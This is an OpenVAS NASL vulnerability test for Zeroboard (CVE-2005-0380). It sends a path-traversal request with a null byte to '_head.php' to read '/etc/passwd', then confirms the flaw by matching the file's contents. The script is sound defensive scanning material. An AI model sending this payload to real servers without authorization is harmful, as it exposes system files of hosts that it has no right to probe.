# OpenVAS Vulnerability Test
# $Id: zeroboard_flaws2.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Zeroboard flaws (2)
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote web server contains several PHP scripts that are prone to
arbitrary PHP code execution and file disclosure attacks.

Description :

The remote host runs Zeroboard, a web BBS application popular in Korea. 

The remote version of this CGI is vulnerable to multiple flaws which may
allow an attacker to execute arbitrary PHP commands on the remote host
by including a PHP file hosted on a third-party server, or to read
arbitrary files with the privileges of the remote web server.";

tag_solution = "Upgrade to Zeroboard 4.1pl6 or later.";

# Ref:  Jeremy Bae  - STG Security

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.16178");
  script_version("$Revision: 9348 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2005-0380");
  script_bugtraq_id(12258);
  script_xref(name:"OSVDB", value:"12925");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Zeroboard flaws (2)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2005 David Maciejak");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_xref(name : "URL" , value : "http://marc.theaimsgroup.com/?l=bugtraq&m=110565373407474&w=2");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! can_host_php(port:port) ) exit(0);

foreach dir( make_list_unique( "/bbs", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = string(dir, "/_head.php?_zb_path=../../../../../../../../../../etc/passwd%00");

  if(http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:")) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );